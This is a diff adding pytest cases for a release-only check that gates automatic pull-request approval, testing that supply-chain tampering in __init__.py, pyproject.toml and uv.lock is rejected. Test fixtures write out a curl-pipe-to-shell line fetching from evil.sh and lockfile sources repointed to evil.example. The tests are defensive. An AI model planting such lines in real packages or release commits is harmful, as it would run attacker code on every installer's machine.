@@ -1,8 +1,10 @@
 """Tests for `scripts/changelog.py check-release-only`.
 
-That command is what decides whether a pull request is approved without a human
-reading it (`.github/workflows/release-auto-approve.yml`), so the cases that must
-NOT pass matter more here than the one that must.
+That command decides whether a pull request is approved without a human reading
+it (`.github/workflows/release-auto-approve.yml`), so the cases that must NOT
+pass matter more here than the one that must. Everything a release is allowed to
+touch is a shipped artifact, and each of those has a test for what happens when
+the diff puts something else inside it.
 """
 
 from pathlib import Path
@@ -13,7 +15,8 @@ from click.testing import CliRunner
 from git import Actor, Repo
 
 from scripts import apps
-from scripts.changelog import changelog, out_of_release_scope
+from scripts.changelog import changelog
+from scripts.release_scope import out_of_release_scope
 
 RELEASED_APP = Path("src/widget")
 
@@ -27,8 +30,9 @@ AUTHOR = Actor("Test", "test@example.com")
         "src/widget/changelog.d/20260101_fragment.md",
         "src/widget/pyproject.toml",
         "src/widget/mitol/widget/__init__.py",
-        # The lockfile pins every workspace member's version, so it moves with the
-        # bump and is part of the release commit by construction.
+        # The lockfile pins every workspace member's version, so it moves with
+        # the bump. Allowed by path here, checked by content in the lockfile
+        # tests below.
         "uv.lock",
     ],
 )
@@ -70,6 +74,7 @@ def _app(root: Path, name: str, version: str) -> None:
         [project]
         name = "mitol-django-{name}"
         version = "{version}"
+        dependencies = ["django>=4.2"]
 
         [tool.bumpver]
         current_version = "{version}"
@@ -77,9 +82,25 @@ def _app(root: Path, name: str, version: str) -> None:
     )
     _write(
         root / "src" / name / "mitol" / name / "__init__.py",
-        f'__version__ = "{version}"\n',
+        f'"""The {name} app."""\n\n__version__ = "{version}"\n',
     )
     _write(root / "src" / name / "CHANGELOG.md", "# Changelog\n")
+
+
+def _lockfile(**versions: str) -> str:
+    """Build a lockfile shaped like uv's: a third-party pin and the members"""
+    members = "\n\n".join(
+        f'[[package]]\nname = "mitol-django-{name}"\nversion = "{version}"\n'
+        f'source = {{ editable = "src/{name}" }}'
+        for name, version in sorted(versions.items())
+    )
+
+    return (
+        'version = 1\nrequires-python = ">=3.11"\n\n'
+        '[[package]]\nname = "django"\nversion = "5.2"\n'
+        'source = { registry = "https://pypi.org/simple" }\n\n'
+        f"{members}\n"
+    )
 
 
 @pytest.fixture
@@ -97,7 +118,8 @@ def workspace(tmp_path, monkeypatch):
     _write(
         tmp_path / "src" / "widget" / "changelog.d" / "20260101_change.md", "- A fix\n"
     )
-    _write(tmp_path / "uv.lock", "version = 1\n")
+    _write(tmp_path / "src" / "widget" / "notes.md", "Notes.\n")
+    _write(tmp_path / "uv.lock", _lockfile(widget="1.0.0", gadget="1.0.0"))
     _write(tmp_path / ".github" / "workflows" / "ci.yml", "name: CI\n")
 
     repo.git.add(A=True)
@@ -117,7 +139,7 @@ def _cut_release(tmp_path: Path, version: str = "1.1.0") -> None:
         f"# Changelog\n\n## {version}\n\n- A fix\n",
     )
     (tmp_path / "src" / "widget" / "changelog.d" / "20260101_change.md").unlink()
-    _write(tmp_path / "uv.lock", "version = 1\n# bumped\n")
+    _write(tmp_path / "uv.lock", _lockfile(widget=version, gadget="1.0.0"))
 
 
 def _run(repo: Repo, base) -> object:
@@ -137,7 +159,31 @@ def test_release_only_passes(workspace, tmp_path):
     result = _run(repo, base)
 
     assert result.exit_code == 0, result.output
-    assert "mitol-django-widget/v1.1.0" in result.output
+    assert "mitol-django-widget 1.1.0" in result.output
+
+
+def test_diff_is_taken_from_the_merge_base(workspace, tmp_path):
+    """Commits landed on the base since the branch point are not the PR's diff.
+
+    A two-dot `base..HEAD` diff would show them reversed, read them as files
+    outside the released app, and refuse to approve a clean release.
+    """
+    repo, base = workspace
+    _write(tmp_path / "unrelated.md", "Landed on main after the branch point.\n")
+    repo.git.add(A=True)
+    moved_on = repo.index.commit("Other work", author=AUTHOR, committer=AUTHOR)
+
+    repo.git.checkout(base.hexsha, b="release")
+    _cut_release(tmp_path)
+    repo.git.add(A=True)
+    repo.index.commit("Release", author=AUTHOR, committer=AUTHOR)
+
+    result = CliRunner().invoke(
+        changelog,
+        ["check-release-only", "--base", moved_on.hexsha, "--target", "HEAD"],
+    )
+
+    assert result.exit_code == 0, result.output
 
 
 def test_release_plus_a_workflow_edit_is_rejected(workspace, tmp_path):
@@ -152,6 +198,18 @@ def test_release_plus_a_workflow_edit_is_rejected(workspace, tmp_path):
     assert ".github/workflows/ci.yml" in result.output
 
 
+def test_a_file_renamed_out_of_the_app_is_rejected(workspace, tmp_path):
+    """Both sides of a rename count, so moving a file out does not hide it"""
+    repo, base = workspace
+    _cut_release(tmp_path)
+    repo.git.mv("src/widget/notes.md", "notes.md")
+
+    result = _run(repo, base)
+
+    assert result.exit_code == 1
+    assert "notes.md is not part of releasing src/widget" in result.output
+
+
 def test_release_plus_code_in_the_same_app_is_rejected(workspace, tmp_path):
     """The case `changelog.py check` already catches still has to fail here"""
     repo, base = workspace
@@ -161,7 +219,73 @@ def test_release_plus_code_in_the_same_app_is_rejected(workspace, tmp_path):
     result = _run(repo, base)
 
     assert result.exit_code == 1
-    assert "Code is changing in src/widget" in result.output
+    assert "views.py is code, not a release" in result.output
+
+
+def test_code_appended_to_the_shipped_init_is_rejected(workspace, tmp_path):
+    """`__init__.py` is exempt by path in `check`; here its content is checked.
+
+    It is imported by everyone who installs the package, and ci.yml publishes to
+    PyPI off a version bump landing on main, so an approval here ships it.
+    """
+    repo, base = workspace
+    _cut_release(tmp_path)
+    init = tmp_path / "src" / "widget" / "mitol" / "widget" / "__init__.py"
+    init.write_text(init.read_text() + '\nimport os\n\nos.system("curl evil.sh|sh")\n')
+
+    result = _run(repo, base)
+
+    assert result.exit_code == 1
+    assert "other than its `__version__` line" in result.output
+
+
+def test_a_dependency_added_to_the_app_pyproject_is_rejected(workspace, tmp_path):
+    """The other path-exempt file: only the two version declarations may move"""
+    repo, base = workspace
+    _cut_release(tmp_path)
+    pyproject = tmp_path / "src" / "widget" / "pyproject.toml"
+    pyproject.write_text(
+        pyproject.read_text().replace(
+            'dependencies = ["django>=4.2"]',
+            'dependencies = ["django>=4.2", "totally-not-malware"]',
+        )
+    )
+
+    result = _run(repo, base)
+
+    assert result.exit_code == 1
+    assert "other than the version declarations" in result.output
+
+
+def test_a_repointed_lockfile_source_is_rejected(workspace, tmp_path):
+    """CI installs from uv.lock while holding the PyPI publishing identity"""
+    repo, base = workspace
+    _cut_release(tmp_path)
+    lock = tmp_path / "uv.lock"
+    lock.write_text(
+        lock.read_text().replace("https://pypi.org/simple", "https://evil.example")
+    )
+
+    result = _run(repo, base)
+
+    assert result.exit_code == 1
+    assert "rewrites locked packages other than the version" in result.output
+
+
+def test_a_package_added_to_the_lockfile_is_rejected(workspace, tmp_path):
+    """A release records a version; it does not lock anything new"""
+    repo, base = workspace
+    _cut_release(tmp_path)
+    lock = tmp_path / "uv.lock"
+    lock.write_text(
+        lock.read_text() + '\n[[package]]\nname = "backdoor"\nversion = "1.0"\n'
+        'source = { registry = "https://evil.example" }\n'
+    )
+
+    result = _run(repo, base)
+
+    assert result.exit_code == 1
+    assert "adds or drops locked packages" in result.output
 
 
 def test_changelog_rewrite_without_a_version_bump_is_rejected(workspace, tmp_path):
@@ -172,7 +296,18 @@ def test_changelog_rewrite_without_a_version_bump_is_rejected(workspace, tmp_pat
     result = _run(repo, base)
 
     assert result.exit_code == 1
-    assert "version in pyproject.toml is unchanged" in result.output
+    assert "still 1.0.0" in result.output
+
+
+def test_a_version_downgrade_is_rejected(workspace, tmp_path):
+    """Require the version to go up, not merely to change"""
+    repo, base = workspace
+    _cut_release(tmp_path, version="0.9.0")
+
+    result = _run(repo, base)
+
+    assert result.exit_code == 1
+    assert "not up" in result.output
 
 
 def test_two_releases_at_once_are_rejected(workspace, tmp_path):
